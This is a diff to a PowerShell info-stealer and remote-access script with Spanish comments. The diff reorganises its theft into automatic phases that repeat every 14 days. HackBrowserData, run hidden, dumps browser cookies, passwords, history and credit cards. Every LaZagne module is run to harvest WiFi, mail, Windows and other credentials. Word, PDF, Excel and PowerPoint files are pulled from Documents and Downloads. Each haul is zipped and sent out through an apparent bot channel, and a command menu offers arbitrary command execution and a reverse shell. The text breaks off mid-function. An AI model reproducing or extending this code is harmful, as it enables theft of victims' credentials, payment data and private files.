@@ -22,8 +22,9 @@ $script:ReverseShellActive = $false
 $script:ShellClient = $null
 $script:ShellStream = $null
 $script:FilesExfiltrated = $false
-$script:BrowserDataSent = $false
-$script:ArchivosComprimidosEnviados = 0
+$script:HackBrowserDataCompleted = $false
+$script:LaZagneCompleted = $false
+$script:ArchivosHackBrowserDataEnviados = 0
 
 New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null
 
@@ -108,233 +109,321 @@ function Take-Screenshot {
     }
 }
 
-# === EJECUTAR LAZAGNE ===
-function Run-LaZagne {
-    param([string]$OutputDir)
-    
-    if (-not (Test-Path $LaZagnePath)) {
-        Write-Log "LaZagne.exe no encontrado"
-        return $false
-    }
-    
-    Write-Log "Ejecutando LaZagne..."
-    
-    try {
-        # Ejecutar LaZagne para todos los navegadores
-        $outputFile = "$OutputDir\lazagne_browsers.txt"
-        $p = Start-Process -FilePath $LaZagnePath -ArgumentList "browsers -oN `"$outputFile`"" -PassThru -WindowStyle Hidden
-        $p.WaitForExit(120000)
-        if (-not $p.HasExited) { $p.Kill() }
-        
-        if (Test-Path $outputFile) {
-            $size = (Get-Item $outputFile).Length
-            Write-Log "LaZagne completado. Archivo: $size bytes"
-            return $true
-        }
-    } catch {
-        Write-Log "Error ejecutando LaZagne: $_"
-    }
-    
-    return $false
-}
-
-# === EJECUTAR HACKBROWSERDATA ===
-function Run-HackBrowserData {
-    param([string]$OutputDir)
-    
-    if (-not (Test-Path $HackPath)) {
-        Write-Log "hackbrowserdata.exe no encontrado"
-        return $false
-    }
-    
-    Write-Log "Ejecutando HackBrowserData..."
-    
-    try {
-        $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$OutputDir`" -f json" -PassThru -WindowStyle Hidden
-        $p.WaitForExit(120000)
-        if (-not $p.HasExited) { $p.Kill() }
-        
-        Write-Log "HackBrowserData completado"
-        return $true
-    } catch {
-        Write-Log "Error ejecutando HackBrowserData: $_"
-    }
-    
-    return $false
-}
-
-# === STEAL DATA - EJECUTA AMBAS HERRAMIENTAS ===
-function Steal-Data {
+# === FASE 1: HACKBROWSERDATA (8 ARCHIVOS) ===
+function Run-HackBrowserData-Phase {
     param([switch]$Auto = $false)
     
-    Send-Message -Text "Iniciando extraccion con ambas herramientas...`n1. LaZagne (mejor para contraseñas)`n2. HackBrowserData (datos generales)"
-    Write-Log "Iniciando extraccion dual - Objetivo: 8 archivos comprimidos"
+    if (-not (Test-Path $HackPath)) {
+        Send-Message -Text "Error: hackbrowserdata.exe no encontrado"
+        return $false
+    }
+    
+    Send-Message -Text "=== FASE 1: HackBrowserData ===`nExtrayendo 8 tipos de datos..."
+    Write-Log "FASE 1: Iniciando HackBrowserData - Objetivo: 8 archivos"
     
     $intentos = 0
     $maxIntentos = 5
     
-    while ($script:ArchivosComprimidosEnviados -lt 8 -and $intentos -lt $maxIntentos) {
+    while ($script:ArchivosHackBrowserDataEnviados -lt 8 -and $intentos -lt $maxIntentos) {
         $intentos++
-        Write-Log "Intento $intentos de $maxIntentos - Archivos enviados: $($script:ArchivosComprimidosEnviados)"
+        Write-Log "HackBrowserData - Intento $intentos de $maxIntentos"
         
         # Cerrar navegadores
         $existing = Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
         
-        $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
+        $outDir = "$env:TEMP\hbd_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
         New-Item -ItemType Directory -Path $outDir -Force | Out-Null
         
-        # === EJECUTAR AMBAS HERRAMIENTAS ===
-        $lazagneSuccess = Run-LaZagne -OutputDir $outDir
-        Start-Sleep -Seconds 2
-        
-        $hackSuccess = Run-HackBrowserData -OutputDir $outDir
-        Start-Sleep -Seconds 2
-        
-        # Reabrir navegadores si es necesario
-        Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
-            try { $_.Kill() } catch {}
-        }
-        
-        # === CREAR ARCHIVOS POR TIPO CON FUENTE ===
-        $tiposArchivos = @(
-            @{ Nombre = "bookmark"; Tipo = "bookmarks"; Fuentes = @() }
-            @{ Nombre = "cookie"; Tipo = "cookies"; Fuentes = @() }
-            @{ Nombre = "download"; Tipo = "downloads"; Fuentes = @() }
-            @{ Nombre = "extension"; Tipo = "extensions"; Fuentes = @() }
-            @{ Nombre = "history"; Tipo = "history"; Fuentes = @() }
-            @{ Nombre = "localstorage"; Tipo = "localstorage"; Fuentes = @() }
-            @{ Nombre = "password"; Tipo = "passwords"; Fuentes = @() }
-            @{ Nombre = "creditcard"; Tipo = "creditcards"; Fuentes = @() }
-        )
-        
-        # Buscar archivos de ambas fuentes
-        $allJsonFiles = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
-        $allTxtFiles = Get-ChildItem $outDir -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue
-        
-        Write-Log "Archivos encontrados - JSON: $($allJsonFiles.Count), TXT: $($allTxtFiles.Count)"
-        
-        # Procesar cada tipo
-        for ($i = 0; $i -lt $tiposArchivos.Count; $i++) {
-            $tipoInfo = $tiposArchivos[$i]
-            $nombreZip = $tipoInfo.Nombre
-            $tipoBusqueda = $tipoInfo.Tipo
-            $zipPath = "$env:TEMP\$nombreZip.zip"
-            $archivosParaZip = @()
-            $fuentesEncontradas = @()
+        try {
+            $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$outDir`" -f json" -PassThru -WindowStyle Hidden
+            $p.WaitForExit(120000)
+            if (-not $p.HasExited) { $p.Kill() }
             
-            # Buscar archivos JSON de HackBrowserData
-            foreach ($file in $allJsonFiles) {
-                if ($file.Name -like "*$tipoBusqueda*") {
-                    $archivosParaZip += $file.FullName
-                    if (-not ($fuentesEncontradas -contains "HackBrowserData")) {
-                        $fuentesEncontradas += "HackBrowserData"
-                    }
-                }
+            Start-Sleep -Seconds 2
+            
+            # Reabrir navegadores
+            Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
+                try { $_.Kill() } catch {}
             }
             
-            # Para passwords, agregar archivo de LaZagne
-            if ($nombreZip -eq "password" -and $lazagneSuccess) {
-                $lazagneFile = "$outDir\lazagne_browsers.txt"
-                if (Test-Path $lazagneFile) {
-                    $archivosParaZip += $lazagneFile
-                    if (-not ($fuentesEncontradas -contains "LaZagne")) {
-                        $fuentesEncontradas += "LaZagne"
-                    }
-                    Write-Log "Agregado archivo de LaZagne a password.zip"
-                }
+            # Definir los 8 tipos
+            $tiposArchivos = @{
+                "bookmarks" = "bookmark"
+                "cookies" = "cookie"
+                "downloads" = "download"
+                "extensions" = "extension"
+                "history" = "history"
+                "localstorage" = "localstorage"
+                "passwords" = "password"
+                "creditcards" = "creditcard"
             }
             
-            # Crear ZIP
-            if ($archivosParaZip.Count -gt 0) {
-                Compress-Archive -Path $archivosParaZip -DestinationPath $zipPath -Force
-                $tamanoMB = [math]::Round((Get-Item $zipPath).Length / 1MB, 2)
+            $allFiles = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
+            
+            if ($allFiles) {
+                Write-Log "HackBrowserData encontro $($allFiles.Count) archivos JSON"
                 
-                $fuenteTexto = if ($fuentesEncontradas.Count -gt 0) { 
-                    "Fuente: $($fuentesEncontradas -join ' + ')" 
-                } else { 
-                    "Fuente: Desconocida" 
+                # Crear directorios temporales
+                $tempDirs = @{}
+                foreach ($tipo in $tiposArchivos.Keys) {
+                    $tempDir = "$env:TEMP\hbd_tipo_$tipo"
+                    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+                    $tempDirs[$tipo] = $tempDir
                 }
                 
-                $caption = "[$($i+1)/8] [$nombreZip.zip] $($tipoInfo.Tipo)`nArchivos: $($archivosParaZip.Count)`nTamano: $tamanoMB MB`n$fuenteTexto`nPC: $env:COMPUTERNAME"
-                
-                if (Send-File -Path $zipPath -Caption $caption) {
-                    $script:ArchivosComprimidosEnviados++
-                    Write-Log "ZIP $nombreZip.zip ($($i+1)/8) enviado. Total: $($script:ArchivosComprimidosEnviados)"
-                } else {
-                    Write-Log "ERROR al enviar $nombreZip.zip"
+                # Clasificar archivos
+                $archivosPorTipo = @{}
+                foreach ($tipo in $tiposArchivos.Keys) {
+                    $archivosPorTipo[$tipo] = @()
                 }
-            } else {
-                # Crear ZIP vacio con info
-                $infoPath = "$env:TEMP\info_$nombreZip.txt"
-                $infoContent = @"
-=== $nombreZip ===
+                
+                foreach ($file in $allFiles) {
+                    $fileMatched = $false
+                    foreach ($tipo in $tiposArchivos.Keys) {
+                        if ($file.Name -like "*$tipo*") {
+                            Copy-Item $file.FullName -Destination $tempDirs[$tipo] -Force
+                            $archivosPorTipo[$tipo] += $file
+                            $fileMatched = $true
+                            break
+                        }
+                    }
+                    if (-not $fileMatched) {
+                        Copy-Item $file.FullName -Destination $tempDirs["localstorage"] -Force
+                        $archivosPorTipo["localstorage"] += $file
+                    }
+                }
+                
+                # Crear y enviar los 8 ZIPs
+                $zipIndex = 0
+                foreach ($tipo in $tiposArchivos.Keys) {
+                    $zipIndex++
+                    $nombreZip = $tiposArchivos[$tipo]
+                    $zipPath = "$env:TEMP\$nombreZip.zip"
+                    $archivosEnTipo = $archivosPorTipo[$tipo]
+                    
+                    if ($archivosEnTipo.Count -gt 0) {
+                        Compress-Archive -Path "$($tempDirs[$tipo])\*" -DestinationPath $zipPath -Force
+                        $tamanoMB = [math]::Round((Get-Item $zipPath).Length / 1MB, 2)
+                        $caption = "[$zipIndex/8] [$nombreZip.zip] HackBrowserData`nTipo: $($tiposArchivos[$tipo])`nArchivos: $($archivosEnTipo.Count)`nTamano: $tamanoMB MB`nPC: $env:COMPUTERNAME"
+                        
+                        if (Send-File -Path $zipPath -Caption $caption) {
+                            $script:ArchivosHackBrowserDataEnviados++
+                            Write-Log "HBD ZIP $nombreZip.zip ($zipIndex/8) enviado. Total: $($script:ArchivosHackBrowserDataEnviados)"
+                        }
+                    } else {
+                        # ZIP vacio
+                        $infoPath = "$env:TEMP\info_hbd_$tipo.txt"
+                        $infoContent = @"
+=== $nombreZip (HackBrowserData) ===
 Fecha: $(Get-Date)
 PC: $env:COMPUTERNAME
-Usuario: $env:USERNAME
-Tipo: $($tipoInfo.Tipo)
+Tipo: $tipo
 Estado: No se encontraron datos
-Herramientas ejecutadas:
-- LaZagne: $(if($lazagneSuccess){"OK"}else{"Fallo"})
-- HackBrowserData: $(if($hackSuccess){"OK"}else{"Fallo"})
-Nota: Chrome/Edge 127+ usa App-Bound Encryption
 "@
-                $infoContent | Out-File $infoPath -Encoding UTF8
-                Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
-                Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
+                        $infoContent | Out-File $infoPath -Encoding UTF8
+                        Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
+                        Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
+                        
+                        $caption = "[$zipIndex/8] [$nombreZip.zip] HackBrowserData`nTipo: $($tiposArchivos[$tipo])`nEstado: Sin datos`nPC: $env:COMPUTERNAME"
+                        
+                        if (Send-File -Path $zipPath -Caption $caption) {
+                            $script:ArchivosHackBrowserDataEnviados++
+                            Write-Log "HBD ZIP vacio $nombreZip.zip ($zipIndex/8) enviado. Total: $($script:ArchivosHackBrowserDataEnviados)"
+                        }
+                    }
+                    
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Seconds 2
+                }
                 
-                $caption = "[$($i+1)/8] [$nombreZip.zip] $($tipoInfo.Tipo)`nEstado: Sin datos`nLaZagne: $(if($lazagneSuccess){'OK'}else{'Fallo'}) | HBD: $(if($hackSuccess){'OK'}else{'Fallo'})`nPC: $env:COMPUTERNAME"
-                
-                if (Send-File -Path $zipPath -Caption $caption) {
-                    $script:ArchivosComprimidosEnviados++
-                    Write-Log "ZIP vacio $nombreZip.zip ($($i+1)/8) enviado. Total: $($script:ArchivosComprimidosEnviados)"
+                # Limpiar
+                foreach ($dir in $tempDirs.Values) {
+                    if (Test-Path $dir) { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }
+                }
+            } else {
+                Write-Log "HackBrowserData no encontro archivos"
+                # Crear 8 ZIPs vacios
+                $nombresFallback = @("bookmark", "cookie", "download", "extension", "history", "localstorage", "password", "creditcard")
+                for ($i = 0; $i -lt 8; $i++) {
+                    $nombreZip = $nombresFallback[$i]
+                    $zipPath = "$env:TEMP\$nombreZip.zip"
+                    $infoPath = "$env:TEMP\info_hbd_$nombreZip.txt"
+                    
+                    "=== $nombreZip (HackBrowserData) ===`nFecha: $(Get-Date)`nPC: $env:COMPUTERNAME`nEstado: Sin datos" | Out-File $infoPath -Encoding UTF8
+                    Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
+                    Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
+                    
+                    if (Send-File -Path $zipPath -Caption "[$($i+1)/8] [$nombreZip.zip] HackBrowserData - Sin datos") {
+                        $script:ArchivosHackBrowserDataEnviados++
+                    }
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    Start-Sleep -Seconds 2
                 }
             }
             
-            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-            Start-Sleep -Seconds 2
+        } finally {
+            if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
         }
         
-        # Limpiar
-        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
-        
-        if ($script:ArchivosComprimidosEnviados -lt 8) {
-            Write-Log "Faltan archivos ($($script:ArchivosComprimidosEnviados)/8). Reintentando..."
-            Send-Message -Text "Faltan $(8 - $script:ArchivosComprimidosEnviados) archivos. Reintentando..."
+        if ($script:ArchivosHackBrowserDataEnviados -lt 8) {
+            Write-Log "HackBrowserData: Faltan archivos ($($script:ArchivosHackBrowserDataEnviados)/8). Reintentando..."
+            Send-Message -Text "HackBrowserData: Faltan $(8 - $script:ArchivosHackBrowserDataEnviados) archivos. Reintentando..."
             Start-Sleep -Seconds 5
         }
     }
     
-    if ($script:ArchivosComprimidosEnviados -ge 8) {
-        $script:BrowserDataSent = $true
-        $script:LastStealTime = Get-Date
+    if ($script:ArchivosHackBrowserDataEnviados -ge 8) {
+        $script:HackBrowserDataCompleted = $true
         Save-State
-        Send-Message -Text "COMPLETADO: 8 archivos enviados.`n`nFuentes utilizadas:`n- LaZagne.exe (mejor para contraseñas)`n- HackBrowserData.exe (datos generales)`n`nArchivos: bookmark, cookie, download, extension, history, localstorage, password, creditcard"
-        Write-Log "EXITO: 8 archivos enviados despues de $intentos intentos"
+        Send-Message -Text "✅ FASE 1 COMPLETADA: HackBrowserData`n8 archivos enviados: bookmark, cookie, download, extension, history, localstorage, password, creditcard"
+        Write-Log "FASE 1 COMPLETADA: 8 archivos de HackBrowserData enviados"
         return $true
     } else {
-        Send-Message -Text "ERROR: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
-        Write-Log "FALLO: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
+        Send-Message -Text "❌ FASE 1 INCOMPLETA: HackBrowserData solo envio $($script:ArchivosHackBrowserDataEnviados)/8"
+        Write-Log "FASE 1 FALLIDA: Solo se enviaron $($script:ArchivosHackBrowserDataEnviados)/8"
         return $false
     }
 }
 
-# === EXFILTRACION DE DOCUMENTOS ===
+# === FASE 2: LAZAGNE (TODOS LOS MODULOS) ===
+function Run-LaZagne-Phase {
+    param([switch]$Auto = $false)
+    
+    if (-not (Test-Path $LaZagnePath)) {
+        Send-Message -Text "Error: LaZagne.exe no encontrado"
+        return $false
+    }
+    
+    Send-Message -Text "=== FASE 2: LaZagne ===`nExtrayendo TODOS los modulos...`n`nModulos disponibles:`n- browsers (Chrome, Firefox, Edge, Opera, Brave, etc.)`n- chats`n- databases`n- games`n- git`n- mails`n- maven`n- memory`n- multimedia`n- php`n- svn`n- sysadmin`n- windows`n- wifi`n- unused"
+    Write-Log "FASE 2: Iniciando LaZagne - Todos los modulos"
+    
+    $outDir = "$env:TEMP\lazagne_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+    
+    $modulos = @(
+        @{ Nombre = "browsers"; Descripcion = "Navegadores (Chrome, Firefox, Edge, Opera, Brave)" }
+        @{ Nombre = "chats"; Descripcion = "Chats" }
+        @{ Nombre = "databases"; Descripcion = "Bases de datos" }
+        @{ Nombre = "games"; Descripcion = "Juegos" }
+        @{ Nombre = "git"; Descripcion = "Git" }
+        @{ Nombre = "mails"; Descripcion = "Correos" }
+        @{ Nombre = "maven"; Descripcion = "Maven" }
+        @{ Nombre = "memory"; Descripcion = "Memoria" }
+        @{ Nombre = "multimedia"; Descripcion = "Multimedia" }
+        @{ Nombre = "php"; Descripcion = "PHP" }
+        @{ Nombre = "svn"; Descripcion = "SVN" }
+        @{ Nombre = "sysadmin"; Descripcion = "Sysadmin" }
+        @{ Nombre = "windows"; Descripcion = "Windows" }
+        @{ Nombre = "wifi"; Descripcion = "WiFi" }
+        @{ Nombre = "unused"; Descripcion = "Otros" }
+    )
+    
+    $totalModulos = $modulos.Count
+    $modulosExitosos = 0
+    $modulosConDatos = 0
+    
+    for ($i = 0; $i -lt $modulos.Count; $i++) {
+        $modulo = $modulos[$i]
+        $numero = $i + 1
+        
+        Write-Log "LaZagne: Ejecutando modulo $($modulo.Nombre) ($numero/$totalModulos)"
+        
+        try {
+            $outputFile = "$outDir\lazagne_$($modulo.Nombre).txt"
+            $p = Start-Process -FilePath $LaZagnePath -ArgumentList "$($modulo.Nombre) -oN `"$outputFile`"" -PassThru -WindowStyle Hidden
+            $p.WaitForExit(60000)
+            if (-not $p.HasExited) { $p.Kill() }
+            
+            if (Test-Path $outputFile) {
+                $size = (Get-Item $outputFile).Length
+                $content = Get-Content $outputFile -Raw -ErrorAction SilentlyContinue
+                
+                # Verificar si tiene datos reales (no solo el banner)
+                $tieneDatos = $content -match "Password|password|User|user|Login|login" -and ($content.Length -gt 500)
+                
+                if ($tieneDatos) {
+                    $modulosConDatos++
+                    $tamanoMB = [math]::Round($size / 1MB, 2)
+                    
+                    # Comprimir el archivo
+                    $zipPath = "$env:TEMP\lazagne_$($modulo.Nombre).zip"
+                    Compress-Archive -Path $outputFile -DestinationPath $zipPath -Force
+                    
+                    $caption = "[$numero/$totalModulos] [LaZagne] $($modulo.Descripcion)`nModulo: $($modulo.Nombre)`nTamano: $tamanoMB MB`nEstado: ✅ CON DATOS`nPC: $env:COMPUTERNAME"
+                    
+                    if (Send-File -Path $zipPath -Caption $caption) {
+                        $modulosExitosos++
+                        Write-Log "LaZagne modulo $($modulo.Nombre) enviado con datos"
+                    } else {
+                        Write-Log "ERROR enviando modulo $($modulo.Nombre)"
+                    }
+                    
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                } else {
+                    Write-Log "LaZagne modulo $($modulo.Nombre): Sin datos relevantes"
+                    # Enviar de todos modos pero marcando que esta vacio
+                    $zipPath = "$env:TEMP\lazagne_$($modulo.Nombre)_vacio.zip"
+                    Compress-Archive -Path $outputFile -DestinationPath $zipPath -Force
+                    
+                    $caption = "[$numero/$totalModulos] [LaZagne] $($modulo.Descripcion)`nModulo: $($modulo.Nombre)`nEstado: ⚪ Sin datos`nPC: $env:COMPUTERNAME"
+                    Send-File -Path $zipPath -Caption $caption | Out-Null
+                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                    $modulosExitosos++
+                }
+            } else {
+                Write-Log "LaZagne modulo $($modulo.Nombre): No se genero archivo"
+            }
+        } catch {
+            Write-Log "Error en modulo $($modulo.Nombre): $_"
+        }
+        
+        Start-Sleep -Seconds 2
+    }
+    
+    # Ejecutar tambien 'all' para obtener todo junto
+    Write-Log "LaZagne: Ejecutando modulo 'all' para respaldo completo..."
+    Send-Message -Text "Generando respaldo completo con 'all'..."
+    
+    try {
+        $allOutput = "$outDir\lazagne_all.txt"
+        $p = Start-Process -FilePath $LaZagnePath -ArgumentList "all -oN `"$allOutput`"" -PassThru -WindowStyle Hidden
+        $p.WaitForExit(120000)
+        if (-not $p.HasExited) { $p.Kill() }
+        
+        if (Test-Path $allOutput) {
+            $size = (Get-Item $allOutput).Length
+            if ($size -gt 1000) {
+                $zipPath = "$env:TEMP\lazagne_all.zip"
+                Compress-Archive -Path $allOutput -DestinationPath $zipPath -Force
+                $tamanoMB = [math]::Round($size / 1MB, 2)
+                
+                $caption = "[EXTRA] [LaZagne] Respaldo COMPLETO (all)`nModulos: Todos`nTamano: $tamanoMB MB`nEstado: ✅ COMPLETO`nPC: $env:COMPUTERNAME"
+                Send-File -Path $zipPath -Caption $caption | Out-Null
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+            }
+        }
+    } catch {
+        Write-Log "Error en modulo 'all': $_"
+    }
+    
+    # Limpiar
+    if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
+    
+    $script:LaZagneCompleted = $true
+    Save-State
+    
+    Send-Message -Text "✅ FASE 2 COMPLETADA: LaZagne`nModulos ejecutados: $totalModulos`nCon datos: $modulosConDatos`nEnviados: $modulosExitosos`n`nNavegadores soportados:`nChrome, Chromium, Firefox, Opera, Opera GX, Edge, Brave, Safari, Vivaldi, Yandex, Torch, Comodo, Cyberfox, Flock, IceCat, IceDragon, K-Meleon, PaleMoon, SeaMonkey, Waterfox, etc."
+    Write-Log "FASE 2 COMPLETADA: LaZagne - $modulosConDatos/$totalModulos con datos"
+    
+    return $true
+}
+
+# === FASE 3: DOCUMENTOS ===
 function Exfiltrate-Documents {
     param([switch]$Auto = $false)
     
-    if (-not $script:BrowserDataSent) {
-        Write-Log "Documentos: Esperando archivos comprimidos primero..."
-        Send-Message -Text "Esperando envio de archivos comprimidos primero..."
-        return
-    }
-    
-    if ($script:FilesExfiltrated -and $Auto) {
-        Write-Log "Documentos ya exfiltrados, saltando..."
-        return
-    }
-    
-    Send-Message -Text "Iniciando exfiltracion de documentos...`nCarpetas: Documentos y Descargas (con subcarpetas)`nOrden: Word -> PDF -> Excel -> PowerPoint"
-    Write-Log "Iniciando exfiltracion de documentos"
+    Send-Message -Text "=== FASE 3: Documentos ===`nBuscando en Documentos y Descargas (con subcarpetas)...`nOrden: Word -> PDF -> Excel -> PowerPoint"
+    Write-Log "FASE 3: Iniciando exfiltracion de documentos"
     
     $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
     $RutaDescargas = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
@@ -345,6 +434,8 @@ function Exfiltrate-Documents {
     
     if ($carpetasBusqueda.Count -eq 0) {
         Send-Message -Text "No se encontraron carpetas"
+        $script:FilesExfiltrated = $true
+        Save-State
         return
     }
     
@@ -431,8 +522,9 @@ function Exfiltrate-Documents {
     
     $script:FilesExfiltrated = $true
     Save-State
-    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos | Exitosos: $($enviados - $errores) | Errores: $errores"
-    Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
+    
+    Send-Message -Text "✅ FASE 3 COMPLETADA: Documentos`nTotal: $totalArchivos | Exitosos: $($enviados - $errores) | Errores: $errores"
+    Write-Log "FASE 3 COMPLETADA: Documentos - Exitosos: $($enviados - $errores), Errores: $errores"
 }
 
 # === REVERSE SHELL ===
@@ -527,8 +619,9 @@ function Save-State {
     $state = @{
         LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
         FilesExfiltrated = $script:FilesExfiltrated
-        BrowserDataSent = $script:BrowserDataSent
-        ArchivosComprimidosEnviados = $script:ArchivosComprimidosEnviados
+        HackBrowserDataCompleted = $script:HackBrowserDataCompleted
+        LaZagneCompleted = $script:LaZagneCompleted
+        ArchivosHackBrowserDataEnviados = $script:ArchivosHackBrowserDataEnviados
     }
     $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
 }
@@ -539,32 +632,57 @@ function Load-State {
             $state = Get-Content $StateFile | ConvertFrom-Json
             if ($state.LastStealTime) { $script:LastStealTime = [DateTime]::Parse($state.LastStealTime) }
             if ($state.FilesExfiltrated -ne $null) { $script:FilesExfiltrated = $state.FilesExfiltrated }
-            if ($state.BrowserDataSent -ne $null) { $script:BrowserDataSent = $state.BrowserDataSent }
-            if ($state.ArchivosComprimidosEnviados -ne $null) { $script:ArchivosComprimidosEnviados = $state.ArchivosComprimidosEnviados }
+            if ($state.HackBrowserDataCompleted -ne $null) { $script:HackBrowserDataCompleted = $state.HackBrowserDataCompleted }
+            if ($state.LaZagneCompleted -ne $null) { $script:LaZagneCompleted = $state.LaZagneCompleted }
+            if ($state.ArchivosHackBrowserDataEnviados -ne $null) { $script:ArchivosHackBrowserDataEnviados = $state.ArchivosHackBrowserDataEnviados }
         } catch {}
     }
 }
 
+# === FLUJO AUTOMATICO ===
 function Check-AutoSteal {
-    if (-not $script:BrowserDataSent -or $script:ArchivosComprimidosEnviados -lt 8) {
-        Write-Log "Iniciando envio de 8 archivos comprimidos..."
-        $stealSuccess = Steal-Data -Auto
-        if ($stealSuccess -and -not $script:FilesExfiltrated) {
-            Start-Sleep -Seconds 5
-            Exfiltrate-Documents -Auto
+    $now = Get-Date
+    
+    # Verificar si han pasado 14 dias para reiniciar ciclo completo
+    if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
+        Write-Log "Han pasado 14 dias - REINICIANDO CICLO COMPLETO..."
+        Send-Message -Text "🔄 Han pasado 14 dias - Reiniciando ciclo completo..."
+        $script:HackBrowserDataCompleted = $false
+        $script:LaZagneCompleted = $false
+        $script:FilesExfiltrated = $false
+        $script:ArchivosHackBrowserDataEnviados = 0
+        $script:LastStealTime = $null
+        Save-State
+        Start-Sleep -Seconds 3
+    }
+    
+    # FASE 1: HackBrowserData (8 archivos)
+    if (-not $script:HackBrowserDataCompleted) {
+        Write-Log "Iniciando FASE 1: HackBrowserData"
+        $success = Run-HackBrowserData-Phase -Auto
+        if (-not $success) {
+            Write-Log "FASE 1 fallo, reintentando en proximo ciclo..."
+            return
         }
-    } elseif (-not $script:FilesExfiltrated) {
-        Write-Log "Exfiltrando documentos pendientes..."
+        Start-Sleep -Seconds 5
+    }
+    
+    # FASE 2: LaZagne (todos los modulos)
+    if ($script:HackBrowserDataCompleted -and -not $script:LaZagneCompleted) {
+        Write-Log "Iniciando FASE 2: LaZagne"
+        Run-LaZagne-Phase -Auto
+        Start-Sleep -Seconds 5
+    }
+    
+    # FASE 3: Documentos
+    if ($script:HackBrowserDataCompleted -and $script:LaZagneCompleted -and -not $script:FilesExfiltrated) {
+        Write-Log "Iniciando FASE 3: Documentos"
         Exfiltrate-Documents -Auto
-    } else {
-        $now = Get-Date
-        if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
-            Write-Log "Reiniciando ciclo..."
-            $script:BrowserDataSent = $false
-            $script:FilesExfiltrated = $false
-            $script:ArchivosComprimidosEnviados = 0
+        if ($script:FilesExfiltrated) {
+            $script:LastStealTime = Get-Date
             Save-State
-            Check-AutoSteal
+            Send-Message -Text "🎉 CICLO COMPLETO FINALIZADO`n`nProximo ciclo en 14 dias.`n`nEl bot ahora acepta comandos:`n/cmd, /steal, /files, /captura, /shell, etc."
+            Write-Log "CICLO COMPLETO FINALIZADO - Proximo ciclo en 14 dias"
         }
     }
 }
@@ -593,27 +711,39 @@ function Process-Cmd {
     switch ($cmd) {
         "/help" {
             Send-Message -Text @"
-Comandos disponibles:
+🤖 COMANDOS DISPONIBLES:
 
-/help - Muestra esta ayuda
+📋 INFORMACION:
 /info - Info del sistema
+/pwd - Directorio actual
 /ls - Listar archivos
 /cd <ruta> - Cambiar directorio
-/pwd - Directorio actual
-/cmd <comando> - Ejecutar comando
+
+⚡ ACCIONES:
 /captura - Screenshot
-/steal - Extraer 8 archivos (LaZagne + HackBrowserData)
-/files - Exfiltrar documentos (Word -> PDF -> Excel -> PowerPoint)
-/shell <IP> [puerto] - Reverse shell
+/cmd <comando> - Ejecutar comando
+
+🔓 EXTRACCION:
+/steal - Forzar ciclo completo (HackBrowserData + LaZagne + Documentos)
+/hack - Solo HackBrowserData (8 archivos)
+/lazagne - Solo LaZagne (todos los modulos)
+/files - Solo Documentos
+
+🌐 REVERSE SHELL:
+/shell <IP> [puerto] - Conectar reverse shell
 /stopshell - Detener reverse shell
 
-FLUJO AUTOMATICO:
-1. 8 archivos con indicacion de fuente:
-   - bookmark.zip, cookie.zip, download.zip, extension.zip
-   - history.zip, localstorage.zip, password.zip, creditcard.zip
-   Fuente: LaZagne (mejor passwords) + HackBrowserData (datos)
-2. Documentos de Documentos y Descargas (con subcarpetas)
-   Orden: Word -> PDF -> Excel -> PowerPoint
+📊 FLUJO AUTOMATICO:
+1️⃣ FASE 1: HackBrowserData (8 archivos)
+   bookmark, cookie, download, extension, history, localstorage, password, creditcard
+   
+2️⃣ FASE 2: LaZagne (15 modulos)
+   browsers, chats, databases, games, git, mails, maven, memory, multimedia, php, svn, sysadmin, windows, wifi, unused
+   
+3️⃣ FASE 3: Documentos
+   Word → PDF → Excel → PowerPoint (Documentos + Descargas + subcarpetas)
+
+🔄 Ciclo se repite cada 14 dias automaticamente
 "@
         }
         
@@ -642,12 +772,29 @@ FLUJO AUTOMATICO:
         }
         
         "/steal" { 
-            $script:ArchivosComprimidosEnviados = 0
